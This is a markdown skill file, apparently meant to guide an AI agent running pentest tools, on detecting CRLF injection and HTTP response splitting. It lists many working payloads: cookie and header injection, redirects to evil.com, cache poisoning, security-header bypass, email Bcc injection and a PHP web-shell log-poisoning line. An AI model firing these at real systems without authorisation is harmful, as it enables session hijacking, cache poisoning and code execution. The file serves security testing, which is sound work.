# CRLF Injection Detection Skill

## Objective
Identify Carriage Return Line Feed (CRLF) injection vulnerabilities that allow HTTP header injection or response splitting.

## Instructions

### 1. Identify Injection Points
Look for user input reflected in:
- HTTP response headers (Location, Set-Cookie, etc.)
- Redirect URLs
- Cookie values
- Custom headers
- Log files

### 2. Basic CRLF Payloads

**Carriage Return Line Feed:**
```
%0d%0a (URL encoded \r\n)
%0D%0A (uppercase)
\r\n (raw)
%0d (CR only)
%0a (LF only)
```

**Header injection test:**
```
/redirect?url=http://example.com%0d%0aX-Injected-Header:test
/redirect?url=http://example.com%0d%0aSet-Cookie:evil=cookie
```

### 3. HTTP Response Splitting

**Basic response splitting:**
```
/page?input=value%0d%0a%0d%0a<html><script>alert(1)</script></html>
```

**Inject complete second response:**
```
/page?input=value%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>Injected</html>
```

### 4. Header Injection Attacks

**Set-Cookie injection:**
```
?url=https://example.com%0d%0aSet-Cookie:%20session=attacker_value
?url=https://example.com%0d%0aSet-Cookie:%20admin=true
```

**Location header manipulation:**
```
?url=https://example.com%0d%0aLocation:%20https://evil.com
```

**Content-Type injection:**
```
?input=value%0d%0aContent-Type:%20text/html
```

**XSS via header injection:**
```
?input=value%0d%0a%0d%0a<script>alert(1)</script>
?input=value%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### 5. Encoding Variations

**URL encoding:**
```
%0d%0a = \r\n
%0d = \r
%0a = \n
```

**Double URL encoding:**
```
%250d%250a
%250d
%250a
```

**Unicode encoding:**
```
%E5%98%8A%E5%98%8D = \r\n in some contexts
\u000d\u000a
```

**Mixed encoding:**
```
%0d%250a
%250d%0a
```

**UTF-8 encoding:**
```
%C0%8D%C0%8A
```

### 6. Filter Bypass Techniques

**Double encoding:**
```
%250d%250a
%25%30%64%25%30%61
```

**Using only CR or LF:**
```
%0d (Carriage Return only)
%0a (Line Feed only)
```

**Tab character:**
```
%09
%0d%09%0a
```

**Null byte:**
```
%00%0d%0a
%0d%00%0a
```

**Case variation:**
```
%0D%0A
%0d%0A
%0D%0a
```

### 7. Platform-Specific Payloads

**Windows:**
```
%0d%0a (CRLF standard)
```

**Unix/Linux:**
```
%0a (LF only may work)
```

**Old macOS:**
```
%0d (CR only)
```

### 8. Specific Header Attacks

**Cache poisoning:**
```
?url=http://example.com%0d%0aX-Forwarded-Host:%20evil.com
```

**Host header injection:**
```
?url=http://example.com%0d%0aHost:%20evil.com
```

**CORS header injection:**
```
?url=http://example.com%0d%0aAccess-Control-Allow-Origin:%20*
```

**Security header bypass:**
```
?url=http://example.com%0d%0aX-XSS-Protection:%200
?url=http://example.com%0d%0aContent-Security-Policy:%20default-src%20*
```

### 9. Log Injection

**Forge log entries:**
```
?user=admin%0d%0a[INFO]%20User%20admin%20logged%20in%20successfully
```

**Log poisoning for LFI:**
```
?user=<?php system($_GET['cmd']); ?>%0d%0a
```

### 10. Email Header Injection

**If input goes to email headers:**
```
email=victim@test.com%0d%0aBcc:%20attacker@evil.com
email=victim@test.com%0d%0aSubject:%20Fake%20Subject
```

### 11. Detection via Response Analysis

**Look for:**
1. User input appearing in response headers
2. Headers with unexpected values
3. Multiple Set-Cookie headers
4. Unexpected redirects

**Use `http1_request` to send:**
```
GET /page?input=test%0d%0aX-Test:injected HTTP/1.1
Host: target.com
```

**Check response for:**
```http
HTTP/1.1 200 OK
X-Test: injected
```

### 12. Chained Attacks

**CRLF → XSS:**
```
?url=a%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

**CRLF → Session fixation:**
```
?url=a%0d%0aSet-Cookie:%20SESSIONID=attacker_session
```

**CRLF → Cache poisoning:**
```
?url=a%0d%0aX-Forwarded-For:%20evil%0d%0a
```

### 13. WebSocket CRLF

**In WebSocket messages:**
```
message: test\r\nmalicious-header: value
```

### 14. Confirm and Document
If confirmed, create finding with:
- Vulnerable parameter
- Injection payload
- Headers successfully injected
- Evidence (response with injected headers)
- Impact (XSS, session fixation, cache poisoning)

## MCP Tools to Use
- `params_extract`: Identify parameters reflected in headers
- `http1_request` / `http2_request`: Test CRLF payloads
- `url_encode`: Encode payloads
- `repeater_tab_with_payload`: Manual testing
- `issue_create`: Report confirmed finding

## Keywords
header injection, http response splitting, response splitting

## References
- PayloadsAllTheThings/CRLF Injection
- OWASP HTTP Response Splitting
- HackTricks CRLF Injection
